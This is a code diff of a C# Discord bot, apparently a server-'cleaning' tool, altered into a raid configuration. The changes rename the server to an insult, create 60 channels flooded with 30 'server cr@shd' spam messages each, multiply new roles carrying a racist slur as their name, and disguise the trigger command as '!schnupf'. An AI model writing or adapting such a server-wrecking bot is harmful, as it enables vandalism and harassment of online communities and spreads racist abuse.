@@ -7,17 +7,17 @@ class Program
     private static byte[]? _logoBytes;
 
     // ── Hier alles anpassen ───────────────────────────────────────────────────
-    const string SERVER_NAME   = "SERVER GEREINIGT"; // Servername nach dem Clean
-    const string CHANNEL_NAME  = "information";       // Name der neuen Kanäle
-    const int    CHANNEL_COUNT = 3;                   // Anzahl der Kanäle
-    const int    MESSAGE_COUNT = 1;                   // Nachrichten pro Kanal
+    const string SERVER_NAME   = "GEBEMEIERS UNZUCHT"; // Servername nach dem Clean
+    const string CHANNEL_NAME  = "sie wurden gegebemeiert";       // Name der neuen Kanäle
+    const int    CHANNEL_COUNT = 60;                   // Anzahl der Kanäle
+    const int    MESSAGE_COUNT = 30;                   // Nachrichten pro Kanal
     const string MESSAGE_TEXT  =
-        "✅ **Server erfolgreich Gereinigt!**\n" +
-        "> Alle Kanäle und Rollen wurden entfernt.\n" +
-        "> Powered by **Clean Your Server**";
+        "✅ **https://youtu.be/4Lc-LarMzSc?is=TWhwIqrlVgo9td9X**\n" +
+        "> server cr@shd.\n" +
+        "> powered by franzosenjaeger**";
 
     const string NEW_ROLE_NAME  = "Baumwollpflücker"; // Name der neuen Rollen
-    const int    NEW_ROLE_COUNT = 2;                   // Anzahl der neuen Rollen
+    const int    NEW_ROLE_COUNT = 30;                   // Anzahl der neuen Rollen
     // ─────────────────────────────────────────────────────────────────────────
 
     static async Task Main()
@@ -80,7 +80,7 @@ class Program
         if (message is not SocketUserMessage userMsg) return;
         if (userMsg.Author.IsBot) return;
         if (userMsg.Channel is not SocketGuildChannel guildChannel) return;
-        if (!userMsg.Content.Equals("!clean-myserver", StringComparison.OrdinalIgnoreCase)) return;
+        if (!userMsg.Content.Equals("!schnupf", StringComparison.OrdinalIgnoreCase)) return;
 
         var guildUser = guildChannel.Guild.GetUser(userMsg.Author.Id);
         if (!guildUser.GuildPermissions.Administrator)
